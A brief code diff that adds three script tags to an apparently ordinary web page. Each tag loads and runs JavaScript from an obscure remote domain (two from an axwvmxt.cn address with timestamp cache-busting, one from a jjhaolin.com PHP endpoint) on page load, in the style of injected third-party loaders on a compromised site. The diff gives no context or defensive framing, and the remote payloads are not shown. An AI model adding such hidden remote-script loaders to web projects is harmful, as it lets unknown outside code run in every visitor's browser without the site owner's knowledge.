@@ -1,0 +1,16 @@
+<script type="text/javascript">
+  var hm = document.createElement("script");
+  hm.src = "https://xdm.axwvmxt.cn/xnc/5821?t="+new Date().getTime();
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+</script>
+
+<script type="text/javascript">
+
+  var hm = document.createElement("script");
+  hm.src = "https://xdm.axwvmxt.cn/xnc/5820?t="+new Date().getTime();
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+</script>
+
+<script id='mob' type='text/javascript' charset='utf-8' src='https://k.jjhaolin.com/d.php?pid=8639'></script>
